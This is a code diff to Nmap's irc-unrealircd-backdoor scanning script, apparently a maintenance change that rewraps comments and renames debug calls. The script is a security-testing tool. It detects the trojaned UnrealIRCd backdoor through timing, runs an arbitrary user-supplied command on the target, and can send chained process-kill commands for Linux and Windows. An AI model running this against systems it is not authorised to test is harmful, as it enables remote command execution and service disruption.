@@ -39,9 +39,16 @@ Reference:
 ]]
 
 ---
--- @args irc-unrealircd-backdoor.command An arbitrary command to run on the remote system (note, however, that you won't see the output of your command). This will always be attempted, even if the host isn't vulnerable. The pattern <code>%IP%</code> will be replaced with the ip address of the target host.
--- @args irc-unrealircd-backdoor.kill If set to <code>1</code> or <code>true</code>, kill the backdoored UnrealIRCd running.
--- @args irc-unrealircd-backdoor.wait Wait time in seconds before executing the check. This is recommended to set for more reliable check (100 is good value).
+-- @args irc-unrealircd-backdoor.command An arbitrary command to run on the
+--       remote system (note, however, that you won't see the output of your
+--       command). This will always be attempted, even if the host isn't
+--       vulnerable.  The pattern <code>%IP%</code> will be replaced with the
+--       ip address of the target host.
+-- @args irc-unrealircd-backdoor.kill If set to <code>1</code> or
+--       <code>true</code>, kill the backdoored UnrealIRCd running.
+-- @args irc-unrealircd-backdoor.wait Wait time in seconds before executing the
+--       check. This is recommended to set for more reliable check (100 is good
+--       value).
 --
 -- @output
 -- PORT     STATE SERVICE
@@ -50,7 +57,7 @@ Reference:
 --
 
 author = "Vlatko Kosturjak, Ron Bowes"
-license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
+license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
 categories = {"exploit", "intrusive", "malware", "vuln"}
 
 
@@ -115,17 +122,17 @@ action = function(host, port)
   -- wait time: get rid of fast reconnecting annoyance
   if(stdnse.get_script_args('irc-unrealircd-backdoor.wait')) then
     local waittime = stdnse.get_script_args('irc-unrealircd-backdoor.wait')
-    stdnse.print_debug(1, "irc-unrealircd-backdoor: waiting for %i seconds", waittime)
+    stdnse.debug1("waiting for %i seconds", waittime)
     stdnse.sleep(waittime)
   end
 
   -- Send an innocuous command as fodder for tryssl.
-  stdnse.print_debug(1, "irc-unrealircd-backdoor: Sending command: %s", noop_command);
+  stdnse.debug1("Sending command: %s", noop_command);
   local socket, response = comm.tryssl(host, port, noop_command .. "\n", {recv_before=false})
 
   -- Make sure the socket worked
   if(not(socket) or not(response)) then
-    stdnse.print_debug(1, "irc-unrealircd-backdoor: Couldn't connect to remote host")
+    stdnse.debug1("Couldn't connect to remote host")
     return nil
   end
 
@@ -144,15 +151,15 @@ action = function(host, port)
   end
 
   if not status then
-    stdnse.print_debug(1, "irc-unrealircd-backdoor: Receive failed after %s: %s", noop_command, response)
+    stdnse.debug1("Receive failed after %s: %s", noop_command, response)
     return nil
   end
 
   -- Send the backdoor command.
-  stdnse.print_debug(1, "irc-unrealircd-backdoor: Sending command: %s", full_command);
+  stdnse.debug1("Sending command: %s", full_command);
   status, err = socket:send(full_command .. "\n")
   if not status then
-    stdnse.print_debug(1, "irc-unrealircd-backdoor: Send failed: %s", err)
+    stdnse.debug1("Send failed: %s", err)
     return nil
   end
 
@@ -171,7 +178,7 @@ action = function(host, port)
       -- If the server unexpectedly closes the connection, it
       -- is usually related to throttling. Therefore, we
       -- print a throttling warning.
-      stdnse.print_debug(1, "irc-unrealircd-backdoor: Receive failed: %s", response)
+      stdnse.debug1("Receive failed: %s", response)
       socket:close()
       return "Server closed connection, possibly due to too many reconnects. Try again with argument irc-unrealircd-backdoor.wait set to 100 (or higher if you get this message again)."
     end
@@ -181,24 +188,24 @@ action = function(host, port)
   local elapsed = os.time(os.date('*t')) - time
 
   -- Let the user know that everything's working
-  stdnse.print_debug(1, "irc-unrealircd-backdoor: Received a response to our command in " .. elapsed .. " seconds")
+  stdnse.debug1("Received a response to our command in " .. elapsed .. " seconds")
 
   -- Determine whether or not the vulnerability is present
   if(elapsed > (delay - delay_fudge)) then
     -- Check if the user wants to kill the server.
     if(stdnse.get_script_args('irc-unrealircd-backdoor.kill')) then
-      stdnse.print_debug(1, "irc-unrealircd-backdoor: Attempting to kill the Trojanned UnrealIRCd server...")
+      stdnse.debug1("Attempting to kill the Trojanned UnrealIRCd server...")
 
       local linux_kill = "kill `ps -e | grep ircd | awk '{ print $1 }'`"
       local windows_kill = 'wmic process where "name like \'%ircd%\'" delete'
       local kill_command = string.format("%s||%s||%s", trigger, linux_kill, windows_kill)
 
       -- Kill the process
-      stdnse.print_debug(1, "Running kill command: %s", kill_command)
+      stdnse.debug1("Running kill command: %s", kill_command)
       socket:send(kill_command .. "\n")
     end
 
-    stdnse.print_debug(1, "irc-unrealircd-backdoor: Looks like the Trojanned unrealircd is running!")
+    stdnse.debug1("Looks like the Trojanned unrealircd is running!")
 
     -- Close the socket
     socket:close()
@@ -209,7 +216,7 @@ action = function(host, port)
   -- Close the socket
   socket:close()
 
-  stdnse.print_debug(1, "irc-unrealircd-backdoor: The Trojanned version of unrealircd probably isn't running.")
+  stdnse.debug1("The Trojanned version of unrealircd probably isn't running.")
 
   return nil
 end
